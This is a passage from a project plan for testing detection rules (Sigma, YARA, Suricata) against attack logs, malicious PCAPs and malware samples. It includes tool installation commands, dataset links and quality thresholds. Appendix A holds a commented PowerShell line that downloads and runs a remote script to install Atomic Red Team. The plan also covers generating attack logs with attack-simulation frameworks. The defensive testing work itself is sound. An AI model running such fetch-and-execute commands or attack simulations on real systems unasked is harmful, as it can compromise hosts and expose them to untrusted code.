### Phase 2: Test Data (Week 2-3)
- [ ] Download and organize EVTX-ATTACK-SAMPLES
- [ ] Download and organize OTRF Security Datasets (Mordor)
- [ ] Generate benign baseline EVTX from clean Windows VM
- [ ] Download malicious PCAPs from malware-traffic-analysis.net
- [ ] Generate benign network baseline PCAPs
- [ ] Set up MalwareBazaar API integration for YARA sample downloads

### Phase 3: True Positive Testing (Week 3-4)
- [ ] Integrate Chainsaw for Sigma rule testing against EVTX
- [ ] Build YARA test harness with sample downloads
- [ ] Build Suricata PCAP test harness
- [ ] Map each ATT&CK technique to its test dataset
- [ ] Automate TP testing in CI pipeline

### Phase 4: False Positive Testing (Week 4-5)
- [ ] Build benign log corpus (48-hour Windows VM recording)
- [ ] Run all rules against benign corpus
- [ ] Establish FP rate baselines
- [ ] Add FP rate thresholds to quality gate

### Phase 5: Coverage & Benchmarking (Week 5-6)
- [ ] Build ATT&CK coverage report generator
- [ ] Build ATT&CK Navigator layer generator
- [ ] Clone SigmaHQ for benchmarking reference
- [ ] Build A/B testing framework (generated vs. reference rules)
- [ ] Generate coverage gap reports

### Phase 6: Full CI/CD (Week 6-7)
- [ ] Complete GitHub Actions pipeline
- [ ] Add deployment stages for supported SIEMs
- [ ] Dashboard for test results and coverage trends
- [ ] Automated rule tuning feedback loop

---

## Appendix A: Key Tool Installation Commands

```bash
# Python packages
pip install pySigma sigma-cli pySigma-backend-sqlite pySigma-backend-splunk
pip install pySigma-backend-elasticsearch pySigma-pipeline-sysmon pySigma-pipeline-windows
pip install yara-python
pip install mitreattack-python
pip install scapy
pip install python-evtx xmltodict

# Chainsaw (Sigma rule testing against EVTX)
wget https://github.com/WithSecureLabs/chainsaw/releases/latest/download/chainsaw-x86_64-unknown-linux-gnu.tar.gz
tar xzf chainsaw-*.tar.gz

# Hayabusa (alternative Sigma testing engine)
wget https://github.com/Yamato-Security/hayabusa/releases/latest/download/hayabusa-linux-x64-gnu.zip
unzip hayabusa-*.zip

# Suricata
sudo apt-get install suricata
# or
docker pull jasonish/suricata:latest

# YARA
sudo apt-get install yara
# or build from source for latest version
git clone https://github.com/VirusTotal/yara.git
cd yara && ./bootstrap.sh && ./configure && make && sudo make install

# Atomic Red Team (for generating attack logs on Windows)
# PowerShell:
# IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)

# CALDERA
git clone https://github.com/mitre/caldera.git --recursive

# DeTT&CT
git clone https://github.com/rabobank-cdc/DeTTECT.git

# Dalton (Suricata rule testing platform)
git clone https://github.com/secureworks/dalton.git
```

## Appendix B: Key Datasets Quick Reference

| Need | Dataset | URL |
|---|---|---|
| Attack EVTX (Sysmon) | EVTX-ATTACK-SAMPLES | `github.com/sbousseaden/EVTX-ATTACK-SAMPLES` |
| Attack JSON logs | OTRF Security Datasets | `github.com/OTRF/Security-Datasets` |
| Hayabusa test EVTX | Hayabusa Sample EVTX | `github.com/Yamato-Security/hayabusa-sample-evtx` |
| Malicious PCAPs | Malware Traffic Analysis | `malware-traffic-analysis.net` |
| Network IDS dataset | CICIDS 2017/2018 | `unb.ca/cic/datasets` |
| Malware samples | MalwareBazaar | `bazaar.abuse.ch` |
| Malware samples | Malshare | `malshare.com` |
| Curated malware families | Malpedia | `malpedia.caad.fkie.fraunhofer.de` |
| PE features (ML) | EMBER | `github.com/elastic/ember` |
| Benign baseline | Generate your own | 48-hr clean Windows VM recording |
| ATT&CK STIX data | MITRE CTI | `github.com/mitre/cti` |
| Reference Sigma rules | SigmaHQ | `github.com/SigmaHQ/sigma` |
| Reference Suricata rules | ET Open | `rules.emergingthreats.net` |

## Appendix C: Key Quality Thresholds

| Metric | Minimum Threshold | Target |
|---|---|---|
| Sigma syntax validity | 100% | 100% |
| YARA compilation success | 100% | 100% |
| Suricata rule validation pass | 100% | 100% |
| Required metadata fields present | 90% | 100% |
| MITRE ATT&CK tag accuracy | 95% | 100% |
| True positive rate (per rule) | 80% | >95% |
| False positive rate (critical rules) | <0.1% | <0.01% |
| False positive rate (medium rules) | <1% | <0.1% |
| ATT&CK technique coverage | 40% | >70% |
| Quality score (structural) | 70/100 | >85/100 |
| Rule scan performance | 10 MB/s | >50 MB/s |
